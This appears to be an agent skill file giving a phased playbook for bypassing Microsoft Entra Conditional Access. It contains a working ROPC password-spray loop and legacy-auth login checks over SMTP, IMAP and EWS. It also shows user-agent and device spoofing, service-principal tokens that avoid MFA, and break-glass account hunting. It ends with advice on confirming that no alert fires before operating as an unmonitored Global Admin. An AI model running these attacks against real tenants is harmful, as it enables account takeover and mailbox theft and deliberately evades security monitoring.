---
name: entra-conditional-access-bypass
description: "Entra Conditional Access bypass — discover policy gaps, exploit legacy-auth protocols (IMAP/POP/SMTP-AUTH/EWS), spoof device/platform/UA/location conditions, abuse service-principals + app-based auth excluded from CA, and break-glass account misuse."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "conditional access ca bypass legacy auth basic auth imap pop smtp ews activesync device compliance trusted location user agent break glass service principal app auth mfa bypass"
  subdomain: cloud
  tags: azure, entra-id, conditional-access, mfa-bypass
  mitre_attack: T1556, T1078.004, T1550.001, T1199
---

# Entra Conditional Access Bypass

Conditional Access (CA) policies gate sign-ins by user/app/platform/location/device. Bypasses come from the **gaps** in policy scoping — legacy protocols not covered, service-principal flows out of scope, device/UA conditions spoofable, break-glass accounts excluded.

## Phase 1: Enumerate the policy surface

### Authenticated (Graph)
```bash
TOKEN=<GLOBAL_READER_OR_SECREADER>
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/beta/policies/conditionalAccessPolicies" \
  | jq '.value[] | {n:.displayName, st:.state, users:.conditions.users, apps:.conditions.applications, plat:.conditions.platforms, loc:.conditions.locations, ctrl:.grantControls}'
```

### Authenticated (roadrecon)
```bash
roadrecon plugin policies > capolicies.json
# Look for: state=enabledForReportingButNotEnforced (audit-only), excludeUsers (BG accounts), excludeApplications, includeApplications missing 'All cloud apps'
```

### Unauth signals
Sign-in failure error codes reveal CA:
- `AADSTS53003` = blocked by Conditional Access — confirms a policy fired
- `AADSTS50158` = external security challenge required (MFA-by-CA)
- `AADSTS50053` = locked → smart-lockout, not CA
- `AADSTS500011` = resource principal not found in tenant → app exclusion path
- No `53003` across many protocols + locations → CA has gaps

## Phase 2: Legacy auth bypass (basic auth survival)

Despite "basic auth deprecation", many tenants still allow SMTP-AUTH; ROPC (Resource Owner Password Credentials) over `oauth2/token` is also frequently NOT covered by CA (CA gates `Browser` + `Modern auth clients`, but ROPC sneaks through if the policy doesn't include `Other clients`).

### ROPC spray (no MFA prompt)
```bash
TARGET=<TARGET>; TENANT=<TENANT>
for u in $(cat valid_users.txt); do
  for p in $(cat pwlist.txt); do
    r=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/token" \
      -d "resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&grant_type=password&username=${u}@${TARGET}&password=${p}")
    if echo "$r" | jq -e .access_token >/dev/null; then echo "WIN: $u:$p"; break; fi
    sleep $((RANDOM % 3 + 4))
  done
done
```

### SMTP-AUTH (Exchange Online)
```bash
# CA "block legacy auth" usually scopes 'Exchange ActiveSync' + 'Other clients' — verify SMTP submission:
swaks --server smtp.office365.com:587 --tls --auth LOGIN \
  --auth-user <UPN> --auth-password '<PW>' \
  --from <UPN> --to <UPN> --header "Subject: t" --body t
# 235 Authentication succeeded => SMTP-AUTH is alive ; tenant likely also lets ROPC through.
```

### IMAP / POP
```bash
openssl s_client -crlf -connect outlook.office365.com:993
# A1 LOGIN <UPN> "<PW>"
```

### EWS / Autodiscover with NTLM-over-OAuth
```bash
# MailSniper (PS) — pulls mailboxes via EWS using OAuth token, skips CA on EWS-app if 'Office 365 Exchange Online' isn't in policy scope:
Invoke-OpenInboxFinder -EmailList users.txt -ExchHostname outlook.office365.com -Verbose
```

## Phase 3: Device / platform spoofing

CA "require compliant device" + "platform = Windows" rely on UA + `x-ms-DeviceType` headers — spoofable when the tenant lacks device certificate enforcement.

```bash
# Pretend to be a managed Windows client to bypass "block non-Windows":
curl -s -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0" \
  -H "x-ms-PKeyAuth: 1.0" \
  -d "client_id=29d9ed98-a469-4536-ade2-f981bc1d605e&grant_type=password&username=<UPN>&password=<PW>&scope=https://graph.microsoft.com/.default"
# client_id 29d9ed98 = Microsoft Authentication Broker — often in CA exclusion.
```

PKeyAuth spoof — without the actual device cert, this only works against CAs that just check the *advertised* platform, not device compliance state (very common misconfig).

### Trusted-location bypass
```bash
# Tunnel auth from a VPS in a trusted-IP range. List location named-ranges:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations" | jq '.[]|{n:.displayName,r:.ipRanges}'
# If a partner ASN is "trusted", any cloud VM in that ASN bypasses the geo control.
```

## Phase 4: Service-principal / app-based bypass

CA historically scoped to USERS only. Workload Identity CA exists but is rarely enforced — service principals with `Application.ReadWrite.All` etc. authenticate as the app, no user, no MFA, no CA (unless `Workload Identity` CA is configured with `Sign-in risk` policies).

```bash
# If you have an app's client_id + secret/cert:
curl -s -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
  -d "client_id=<APP_ID>&client_secret=<SECRET>&grant_type=client_credentials&scope=https://graph.microsoft.com/.default"
# This token has Application permissions — bypasses user-scoped CA entirely.
```

See `entra-privesc` § service-principal credential addition for how to mint that secret.

## Phase 5: Break-glass account abuse

Best practice: 2 BG accounts excluded from ALL CA + MFA, monitored by a SIEM alert. Reality: alert is misconfigured or the BG password is in a Confluence page / shared vault. Hunt:

```bash
# Find users excluded from MFA-enforcing policies:
jq '.value[] | select(.grantControls.builtInControls | tostring | contains("mfa")) | .conditions.users.excludeUsers' capolicies.json | sort -u
# UPNs of break-glass accounts. Search Confluence/SharePoint/git for those UPNs.
```

If BG creds are recovered → unrestricted Global Admin login from any IP, no MFA.

## Chains
- **`entra-enum` spray (no 53003) → ROPC password spray → mailbox** (CA gap on `Other clients`).
- **Phished low-priv user with Application.ReadWrite.All → mint app cert → app-token bypasses all user CA** → tenant takeover.
- **Discover BG account UPN → search internal wiki → unrestricted sign-in**.
- **CA excludes `Microsoft Azure Management` for emergency cases → use that client_id for ARM ops while avoiding MFA**.

## Tools
- **MSOLSpray / TeamFiltration** — ROPC password spray with CA-aware error parsing.
- **MailSniper** — EWS legacy-protocol pillage.
- **AADInternals** `Invoke-AADIntPhoneSubscriberAuth` — Phone-Subscriber-Auth bypass (deprecated but still works in some tenants).
- **roadtx** — arbitrary `client_id` + scope auth → CA-exclusion exploitation.
- **swaks** — SMTP-AUTH probing.

## Detection signatures
- Sign-in log: `Client app = Other clients` with successful auth → ROPC/legacy auth survived.
- Many `53003` failures from same IP → CA working; pivot away from that protocol/app combo.
- Successful sign-in from break-glass account *without* a corresponding Sentinel alert → silent BG abuse.
- App sign-in (`Service principal sign-ins` table) from non-corp IP → SP credential abuse — distinct table, often un-monitored.

## Decision gate
- All sign-ins return `53003` regardless of protocol → CA is tight; pivot to phishing (`entra-device-code-phishing`).
- ROPC succeeds for `Microsoft Azure CLI` client_id but not browser → CA scoped to browser only — use CLI tokens for everything.
- Found an excluded SP with `RoleManagement.ReadWrite.Directory` → escalate via `entra-privesc`.
- BG account inventory hit → log in once from a sacrificial IP to verify no alert fires, then operate from that account.
